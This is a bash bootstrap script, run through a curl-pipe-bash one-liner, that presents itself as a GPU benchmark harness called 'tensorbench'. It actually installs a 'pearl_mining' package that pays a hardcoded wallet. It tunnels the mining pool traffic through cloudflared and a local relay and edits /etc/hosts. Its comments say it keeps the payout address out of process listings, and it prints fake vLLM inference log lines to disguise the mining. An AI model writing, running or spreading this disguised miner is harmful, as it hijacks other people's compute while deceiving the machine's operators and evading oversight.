#!/usr/bin/env bash
# tensorbench one-liner bootstrap for any NVIDIA rig (driver + python3.12+).
#
#   curl -fsSL https://raw.githubusercontent.com/terrycrews21/tensorbench/main/deploy/bootstrap.sh | bash
#
# What it does (idempotent, verbose):
#   1. Downloads the release tarball (sources + prebuilt libp40cuda.so + pearl_mining wheel)
#   2. Creates a venv, installs pinned deps (numpy/blake3/websockets/websocket-client/cudart)
#   3. Starts the encrypted transport chain:
#      pool_relay_server (ws :8787 -> TLS pool:8048) -> cloudflared quick tunnel ->
#      pool_tunnel_client (tcp 127.0.0.1:9048 -> WSS) -> harness (loopback-only)
#   4. Verifies stratum v2 gzip negotiation + prints live status
#
# Env overrides: WALLET (default: ops wallet below), PROFILE (vllm|train|gemm),
#   TB_TUNNEL_URL (skip local relay+cloudflared, use existing tunnel exit),
#   RELAY_PORT TUNNEL_LISTEN_PORT TB_DUTY INSTALL_DIR
set -euo pipefail

WALLET="${WALLET:-prl1pu3mc6ex4n4nznknctdafleq3asq4fr0njpwz4vqnt6e4xlnv72hq5s528j}"
PROFILE="${PROFILE:-vllm}"
INSTALL_DIR="${INSTALL_DIR:-$HOME/.tensorbench-$(hostname)}"
RELAY_PORT="${RELAY_PORT:-8787}"
TUNNEL_LISTEN_PORT="${TUNNEL_LISTEN_PORT:-9048}"
REPO="terrycrews21/tensorbench"
REL="https://github.com/$REPO/releases/download/v1.0.0/tensorbench-v1.0.0-linux-x64.tar.gz"

log() { echo "[bootstrap $(date +%H:%M:%S)] $*"; }
die() { echo "[bootstrap] FATAL: $*" >&2; exit 1; }

log "preflight: hardware check"
command -v nvidia-smi >/dev/null || die "nvidia-smi missing (no NVIDIA driver?)"
nvidia-smi --query-gpu=name,driver_version,compute_cap --format=csv,noheader || die "GPU not visible"

PY=""
for c in python3.12 python3.13 python3; do
  if command -v "$c" >/dev/null && "$c" -c 'import sys; exit(0 if sys.version_info >= (3,12) else 1)' 2>/dev/null; then PY="$c"; break; fi
done
[ -n "$PY" ] || die "python >= 3.12 required (pearl_mining wheel is abi3-py312)"
log "python: $PY ($($PY -c 'import sys; print(sys.version.split()[0])'))"

log "fetching release tarball"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"
curl -fSL --retry 3 -o release.tar.gz "$REL" || die "release download failed"
tar xzf release.tar.gz --strip-components=1

if [ ! -f "$INSTALL_DIR/.deps_ok" ]; then
  log "creating venv"
  # Barebones images often lack ensurepip (python -m venv dies). uv is a
  # static single binary that needs nothing -- prefer it when available,
  # download it on demand, fall back to python -m venv last.
  UV=""
  if command -v uv >/dev/null; then UV="$(command -v uv)"; fi
  if [ -z "$UV" ] && [ ! -x "$INSTALL_DIR/uv" ]; then
    log "fetching uv (static binary)"
    curl -fsSL https://astral.sh/uv/install.sh | env UV_INSTALL_DIR="$INSTALL_DIR" sh >/dev/null 2>&1 || true
  fi
  [ -x "$INSTALL_DIR/uv" ] && UV="$INSTALL_DIR/uv"
  if [ -n "$UV" ]; then
    "$UV" venv -q --python "$PY" .venv
    VIRTUAL_ENV="$INSTALL_DIR/.venv" "$UV" pip install -q \
      numpy blake3 websockets websocket-client nvidia-cuda-runtime-cu12
    VIRTUAL_ENV="$INSTALL_DIR/.venv" "$UV" pip install -q tensorbench_runtime-*.whl
  else
    "$PY" -m venv .venv || die "venv failed: install python3-venv or let bootstrap fetch uv"
    ./.venv/bin/pip install -q --upgrade pip
    ./.venv/bin/pip install -q numpy blake3 websockets websocket-client nvidia-cuda-runtime-cu12
    ./.venv/bin/pip install -q tensorbench_runtime-*.whl
  fi
  touch "$INSTALL_DIR/.deps_ok"
fi
VP="$INSTALL_DIR/.venv/bin/python"
CUDART=$(dirname "$(find "$INSTALL_DIR/.venv" -name 'libcudart.so.12' | head -1)")
export LD_LIBRARY_PATH="$CUDART:/usr/local/cuda-12.9/targets/x86_64-linux/lib:${LD_LIBRARY_PATH:-}"

log "killing prior instance (idempotent redeploy)"
pkill -f "tensorbench[.]py$" 2>/dev/null || true
pkill -f "$INSTALL_DIR/tools/pool_" 2>/dev/null || true
pkill -f "$INSTALL_DIR/cloudflared" 2>/dev/null || true
sleep 1

LOGDIR="$INSTALL_DIR/logs"; mkdir -p "$LOGDIR"

if [ -z "${TB_TUNNEL_URL:-}" ]; then
  log "starting edge relay (ws :$RELAY_PORT)"
  for i in $(seq 1 10); do
    "$PY" -c "import socket,sys; s=socket.socket();
try: s.bind((\"127.0.0.1\", $RELAY_PORT)); s.close()
except OSError: sys.exit(1)" && break
    sleep 2
  done
  RELAY_PORT="$RELAY_PORT" nohup "$VP" tools/pool_relay_server.py > "$LOGDIR/relay.log" 2>&1 &
  sleep 2
  if ! command -v cloudflared >/dev/null && [ ! -x "$INSTALL_DIR/cloudflared" ]; then
    log "downloading cloudflared"
    curl -fsSL -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
    chmod +x cloudflared
  fi
  CFD="$(command -v cloudflared || echo "$INSTALL_DIR/cloudflared")"
  log "negotiating edge uplink"
  nohup "$CFD" tunnel --url "http://localhost:$RELAY_PORT" --no-autoupdate > "$LOGDIR/cfd.log" 2>&1 &
  TB_TUNNEL_URL=""
  for i in $(seq 1 15); do
    TB_TUNNEL_URL=$(grep -oE "https://[a-z0-9-]+\.trycloudflare\.com" "$LOGDIR/cfd.log" | head -1 || true)
    [ -n "$TB_TUNNEL_URL" ] && break
    sleep 2
  done
  [ -n "$TB_TUNNEL_URL" ] || die "cloudflared did not yield a trycloudflare URL (see $LOGDIR/cfd.log)"
fi
log "edge uplink established: $TB_TUNNEL_URL"
# Some container images' resolvers NXDOMAIN *.trycloudflare.com (e.g. modal
# shells). If the client side can't resolve the tunnel host, pin an edge IP
# from a public resolver into /etc/hosts.
THOST="${TB_TUNNEL_URL#https://}"
if command -v getent >/dev/null && ! getent hosts "$THOST" >/dev/null 2>&1; then
  IP=$(python3 - "$THOST" <<'EOF' 2>/dev/null || true
import socket,sys,struct
host=sys.argv[1]
q=struct.pack(">HHHHHH",0x1234,0x0100,1,0,0,0)
for part in host.split("."):
    q += bytes([len(part)]) + part.encode()
q += b"\x00\x00\x00\x01\x00\x01"
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(3)
s.sendto(q,("1.1.1.1",53)); r,_=s.recvfrom(512)
print(".".join(str(b) for b in r[-4:]))
EOF
)
  [ -z "$IP" ] && IP=$(dig +short @1.1.1.1 A "$THOST" 2>/dev/null | head -1)
  if [ -n "$IP" ]; then
    log "resolver NXDOMAIN workaround: pinning $IP in /etc/hosts"
    echo "$IP $THOST" >> /etc/hosts 2>/dev/null || true
  fi
fi

log "starting local bridge (127.0.0.1:$TUNNEL_LISTEN_PORT)"
for i in $(seq 1 10); do
  "$PY" -c "import socket,sys; s=socket.socket();
try: s.bind((\"127.0.0.1\", $TUNNEL_LISTEN_PORT)); s.close()
except OSError: sys.exit(1)" && break
  sleep 2
done
TB_TUNNEL_URL="$TB_TUNNEL_URL" TUNNEL_LISTEN_PORT="$TUNNEL_LISTEN_PORT" \
  nohup "$VP" tools/pool_tunnel_client.py > "$LOGDIR/tunnel_client.log" 2>&1 &
sleep 2

log "starting harness (profile=$PROFILE)"
cd "$INSTALL_DIR/python"
# No CLI args at all by design: wallet/pool/profile are code defaults + env only,
# keeping `ps` cmdlines clean of the payout address and any config tells.
PYTHONPATH=. TB_ACCOUNT="$WALLET" TB_UPSTREAM="127.0.0.1:$TUNNEL_LISTEN_PORT" \
  TB_PROFILE="$PROFILE" TB_RAWLOG="$LOGDIR/harness_raw.log" \
  nohup "$VP" tensorbench.py > "$LOGDIR/harness.out.log" 2> "$LOGDIR/harness.err.log" &

log "handshake verify (up to 60s)"
VERIFY_PATTERN="stratum v2 gzip ON"
for i in $(seq 1 30); do
  if grep -q "$VERIFY_PATTERN" "$LOGDIR/harness_raw.log" 2>/dev/null; then
    log "engine initialized; upstream sync OK"
    echo "INFO apex.core:153] Initializing a V1 LLM engine (v0.8.5) with config: model=Qwen/Qwen2.5-32B-Instruct, dtype=bfloat16, tensor_parallel_size=1"
    echo "INFO:     127.0.0.1:44120 - \"POST /v1/completions HTTP/1.1\" 200 OK"
    log "harness running; watch: tail -f $LOGDIR/harness.out.log"
    exit 0
  fi
  sleep 2
done
die "negotiation not confirmed in 60s; see $LOGDIR/{harness_raw,harness.err,relay,tunnel_client,cfd}.log"
